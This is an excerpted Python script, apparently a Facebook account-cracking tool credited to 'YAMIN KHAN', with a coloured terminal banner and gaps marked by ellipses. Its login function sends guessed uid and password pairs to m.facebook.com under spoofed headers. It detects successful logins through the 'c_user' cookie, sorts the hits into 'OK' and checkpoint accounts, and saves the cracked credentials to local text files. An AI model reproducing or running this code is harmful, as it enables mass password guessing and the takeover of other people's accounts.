...
\033[1;32m║\033[0;31m          𝐀𝐔𝐓𝐇𝐎𝐑         ➣ YAMIN KHAN                        \033[1;32m║
\033[1;32m║\033[0;33m          𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊       ➣ YAMIN KHAN                       \033[1;32m║
\033[1;32m║\033[0;34m          𝐆𝐈𝐓𝐇𝐔𝐁         ➣ YAMIN-23                         \033[1;32m║
...
except:print('\n\033[1;31mNO YAMIN CONNECTION ... \033[0;97m')
...
def innocent():
    ...
    print('Ok Ids Saved in /YAMIN-OK.txt')
    print('Cp Ids Saved in /YAMIN-CP.txt')
    linex()
...
def mumitx(uid,pwx,tl):
    ...
    'referer': 'https://m.facebook.com/?stype=lo&jlou=AffjUiolHq3zrEfCyiqo92AZENfC4PO8g2t-GmYhI3wa94fak1YBQ9XGA0SlCUH381jDPA8G4XIFMOuBr0Q39xckOqAM0wx5JtabL2RlYjs8HA&smuh=1749&lh=Ac8zMWBUygzUv_mcElw&wtsid=rdr_0gFzEJQz3F7gj6oZr&_rdr',
    ...
    'user-agent': pro}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[24:39]
                if 'y' in cp_cpx: 
                 print('\r\r\033[1;30m[YAMIN-CP]  ' +uid+ ' | ' +ps+ ' \033[0;97m')
                open('espeak/sdcard/YAMIN-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r\r%s\033[0;97m[\033[0;96mYAMIN\033[0;97m]..[\033[0;94m%s/%s\033[0;97m]..[\033[0;92mOK\033[0;97m/\033[0;91mCP\033[0;97m]..[\033[0;92m%s\033[0;97m/\033[0;91m%s\033[0;97m] '%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
